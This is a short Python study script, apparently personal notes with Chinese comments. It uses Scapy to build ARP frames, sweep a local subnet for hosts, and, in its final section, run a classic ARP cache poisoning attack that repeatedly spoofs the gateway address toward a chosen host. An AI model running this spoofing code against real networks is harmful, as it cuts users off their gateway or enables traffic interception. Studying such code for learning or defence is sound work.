"""
Date: 2022.04.22 09:11:40
LastEditors: Rustle Karl
LastEditTime: 2022.04.23 23:53:21
"""
from scapy.data import *
from scapy.layers.inet import Ether, RandNum
from scapy.layers.l2 import ARP, arping, srp
from scapy.sendrecv import send

"""
scapy -H
"""

# ether = Ether(type=0x0806)
ether = Ether(type=ETH_P_ARP)
ether.show()

arp = Ether() / ARP()
arp.show()

# ----------------------------------------------------------------------

# ARP Ping 在本地以太网络上最快速地发现主机的方法
answer, unanswer = srp(
    Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst="192.168.0.0/24"), timeout=2
)

answer.summary(lambda s, r: r.sprintf("%Ether.src% %ARP.psrc%"))

# 以上两个命令相当于
arping("192.168.0.*", timeout=2)

# ----------------------------------------------------------------------

# ARP 缓存投毒 这种攻击可以通过 VLAN 跳跃攻击投毒 ARP 缓存，使得其他客户端无法加入真正的网关地址。

# 经典的 ARP 缓存投毒：
arp = Ether(dst="9c:bc:f0:12:3d:4d") / ARP(
    op="who-has", psrc="192.168.0.1", pdst="192.168.0.101"
)
arp.show()
send(arp, inter=RandNum(10, 40), loop=1)
